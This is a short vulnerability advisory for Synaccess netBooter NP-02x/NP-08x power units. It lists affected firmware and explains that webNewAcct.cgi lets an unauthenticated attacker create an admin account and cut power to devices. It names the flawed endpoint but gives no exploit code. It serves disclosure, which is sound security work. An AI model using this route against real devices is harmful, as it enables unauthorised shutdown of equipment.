Synaccess netBooter NP-02x/NP-08x 6.8 Authentication Bypass


Vendor: Synaccess Networks Inc.
Product web page: https://www.synaccess-net.com
Affected version: NP-0201D (ver 6.8C)
                  NP-02    (ver 6.5C)
                  NP-02    (ver 6.4BC)
                  NP-0801D (ver 6.4A)
                  NP-08    (ver 6.10)
                  NP-02    (ver 5.53BC)

Summary: netBooter NP-02B and NP-02BH provide independent
control of one or two outlets in a small, robust form factor.
Manageable via TCP/IP network or direct serial connection
and 1U brackets (optional) for mounting. Control power to
your devices with the ability to fit just about anywhere.

netBooter NP-0801DU and NP-0801DUH PDUs provide secured
remote power source management of 8 independent outlets.
Includes true RMS AC current reading and environment
temperature monitoring* via TCP/IP networks or local direct
connection.

Desc: netBooter suffers from an authentication bypass
vulnerability due to missing control check when calling
webNewAcct.cgi script while creating users. This allows an
unauthenticated attacker to create admin user account and
bypass authentication giving her the power to turn off a
power supply to a resource.

Tested on: Synaccess server
